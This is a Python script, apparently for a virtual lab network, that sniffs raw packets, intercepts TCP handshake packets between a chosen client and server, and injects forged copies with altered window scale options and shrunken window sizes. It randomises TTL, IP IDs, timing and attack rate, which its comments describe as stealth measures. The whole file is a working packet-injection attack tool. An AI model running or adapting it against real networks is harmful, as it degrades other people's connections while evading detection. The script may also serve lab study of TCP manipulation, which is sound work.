import socket
import struct
import binascii
import random
import time

IP_HEADER_FORMAT = '!BBHHHBBH4s4s'
TCP_HEADER_FORMAT = '!HHLLBBHHH'

def calculate_checksum(data):
    """Calculate TCP/IP checksum."""
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def parse_tcp_packet(packet):
    """Parse IP and TCP headers from a packet."""
    try:
        # IP header (20 bytes)
        if len(packet) < 20:
            return None
            
        ip_header = packet[:20]
        iph = struct.unpack(IP_HEADER_FORMAT, ip_header)
        src_ip = socket.inet_ntoa(iph[8])
        dst_ip = socket.inet_ntoa(iph[9])

        # TCP header (assume 20 bytes + options)
        if len(packet) < 40:  # IP(20) + TCP(20) minimum
            return None
            
        tcp_header = packet[20:48]  # Adjust based on options length
        tcph = struct.unpack(TCP_HEADER_FORMAT, tcp_header[:20])
        src_port, dst_port = tcph[0], tcph[1]
        seq_num, ack_num = tcph[2], tcph[3]
        data_offset = (tcph[4] >> 4) * 4  # In bytes
        flags = tcph[5]
        window_size = tcph[6]

        # Extract options (if any)
        options = packet[20 + 20:20 + data_offset] if data_offset > 20 else b''

        return {
            'src_ip': src_ip, 'dst_ip': dst_ip,
            'src_port': src_port, 'dst_port': dst_port,
            'seq_num': seq_num, 'ack_num': ack_num,
            'flags': flags, 'window_size': window_size,
            'options': options
        }
    except (struct.error, socket.error, IndexError):
        return None

def craft_tcp_packet(parsed_packet, window_scale=0, reduce_window=False):
    """Craft a modified TCP packet with variable window scaling for stealth."""
    # IP Header
    ip_ver_ihl = 0x45
    ip_tos = 0
    ip_len = 0  # Kernel fills
    ip_id = random.randint(1000, 65535)  # Randomize IP ID for stealth
    ip_frag = 0
    ip_ttl = random.choice([64, 128, 255])  # Vary TTL to avoid patterns
    ip_proto = socket.IPPROTO_TCP
    ip_checksum = 0
    src_ip_bytes = socket.inet_aton(parsed_packet['src_ip'])
    dst_ip_bytes = socket.inet_aton(parsed_packet['dst_ip'])
    ip_header = struct.pack(IP_HEADER_FORMAT, ip_ver_ihl, ip_tos, ip_len, ip_id,
                            ip_frag, ip_ttl, ip_proto, ip_checksum, src_ip_bytes, dst_ip_bytes)

    # TCP Header with variable window scaling
    seq_num = parsed_packet['seq_num']
    ack_num = parsed_packet['ack_num']
    data_offset = 7 << 4  # 28 bytes (20 header + 8 options)
    flags = parsed_packet['flags']  # Preserve SYN or other flags
    
    # Variable window size reduction for stealth
    original_window = parsed_packet['window_size']
    if reduce_window and original_window > 1024:
        # Reduce window by 30-70% randomly
        reduction_factor = random.uniform(0.3, 0.7)
        window_size = max(1024, int(original_window * reduction_factor))
    else:
        window_size = original_window
    
    tcp_checksum = 0
    urgent_ptr = 0
    
    # Variable Window Scale option for stealth - not always zero
    if window_scale == -1:  # Special value for random selection
        window_scale = random.choice([0, 0, 1, 2])  # Bias towards 0 but include others
    
    # Window Scale option: Kind=3, Length=3, Shift Count=variable
    options = bytes([3, 3, window_scale, 1, 1, 0, 0, 0])  # Window Scale + NOP padding
    tcp_header = struct.pack(TCP_HEADER_FORMAT, parsed_packet['src_port'], parsed_packet['dst_port'],
                             seq_num, ack_num, data_offset, flags, window_size, tcp_checksum, urgent_ptr) + options

    # TCP Checksum
    pseudo_header = src_ip_bytes + dst_ip_bytes + struct.pack('!BBH', 0, ip_proto, len(tcp_header))
    tcp_checksum = calculate_checksum(pseudo_header + tcp_header)
    tcp_header = struct.pack(TCP_HEADER_FORMAT, parsed_packet['src_port'], parsed_packet['dst_port'],
                             seq_num, ack_num, data_offset, flags, window_size, tcp_checksum, urgent_ptr) + options

    return ip_header + tcp_header

def is_tcp_packet(packet):
    ip_header = packet[14:34]
    iph = struct.unpack(IP_HEADER_FORMAT, ip_header)
    return iph[6] == 6, iph, ip_header

def is_relevant_ip(src_ip, dst_ip, client_ip, server_ip):
    return (src_ip == client_ip and dst_ip == server_ip) or (src_ip == server_ip and dst_ip == client_ip)

def is_syn_or_synack(flags):
    return flags & 0x02 or flags & 0x12

def handle_attack(parsed, attack_counter, sock_send):
    attack_type = random.choice(['zero_scale', 'reduce_scale', 'reduce_window'])
    if attack_type == 'zero_scale':
        new_packet = craft_tcp_packet(parsed, window_scale=0)
        print(f"  → Attack #{attack_counter}: Set Window Scale = 0")
    elif attack_type == 'reduce_scale':
        scale = random.choice([1, 2])
        new_packet = craft_tcp_packet(parsed, window_scale=scale)
        print(f"  → Attack #{attack_counter}: Set Window Scale = {scale}")
    else:
        normal_scale = random.choice([3, 4, 7])
        new_packet = craft_tcp_packet(parsed, window_scale=normal_scale, reduce_window=True)
        print(f"  → Attack #{attack_counter}: Reduced window size, Scale = {normal_scale}")
    time.sleep(random.uniform(0.001, 0.01))
    sock_send.sendto(new_packet, (parsed['dst_ip'], 0))

def forward_packet(sock_send, packet, dst_ip):
    sock_send.sendto(packet, (dst_ip, 0))

def main():
    client_ip = "192.168.56.10"
    server_ip = "192.168.56.20"
    interface = "enp0s3"

    attack_probability = 0.7
    attack_counter = 0
    total_syns = 0

    sock_sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    sock_sniff.bind((interface, 0))
    sock_send = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    print("Starting TCP Window Scaling Attack...")
    print(f"Attack probability: {attack_probability*100}%")
    print("Sniffing for TCP SYN packets...")

    while True:
        packet, _ = sock_sniff.recvfrom(65535)
        is_tcp, iph, _= is_tcp_packet(packet)
        if not is_tcp:
            continue
        src_ip = socket.inet_ntoa(iph[8])
        dst_ip = socket.inet_ntoa(iph[9])
        if not is_relevant_ip(src_ip, dst_ip, client_ip, server_ip):
            continue
        parsed = parse_tcp_packet(packet[14:])
        if parsed is None:
            continue
        if is_syn_or_synack(parsed['flags']):
            total_syns += 1
            print(f"Intercepted SYN/SYN-ACK #{total_syns}: {src_ip}:{parsed['src_port']} -> {dst_ip}:{parsed['dst_port']}")
            if random.random() < attack_probability:
                attack_counter += 1
                handle_attack(parsed, attack_counter, sock_send)
            else:
                print("  → Letting packet pass (stealth)")
                forward_packet(sock_send, packet[14:], parsed['dst_ip'])
        else:
            forward_packet(sock_send, packet[14:], parsed['dst_ip'])

if __name__ == "__main__":
    main()